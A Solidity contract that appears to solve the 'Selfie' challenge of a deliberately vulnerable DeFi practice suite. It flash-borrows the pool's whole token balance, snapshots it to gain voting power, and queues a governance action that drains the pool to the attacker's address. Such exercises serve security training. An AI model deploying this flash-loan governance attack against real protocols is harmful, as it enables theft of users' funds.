// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract HackSelfiePool is IERC3156FlashBorrower {
    SelfiePool public immutable selfiePool;
    SimpleGovernance public immutable simpleGovernance;
    ERC20Snapshot public immutable token;
    address immutable owner;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 public actionId;

    constructor(SelfiePool _selfiePool, SimpleGovernance _simpleGovernance) {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        token = _selfiePool.token();
        owner = msg.sender;
    }

    // Used to flashloan and create the proposal on governance, wait 2 days then call the executeAction to be rich...
    function attack() external {
        selfiePool.flashLoan(IERC3156FlashBorrower(this), address(token), token.balanceOf(address(selfiePool)), "");
    }

    // have all the funds here so create the governance action
    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(selfiePool), "you're not the flashloan pool");
        DamnValuableTokenSnapshot(address(token)).snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));
        token.approve(msg.sender, _amount);
        return CALLBACK_SUCCESS;
    }
}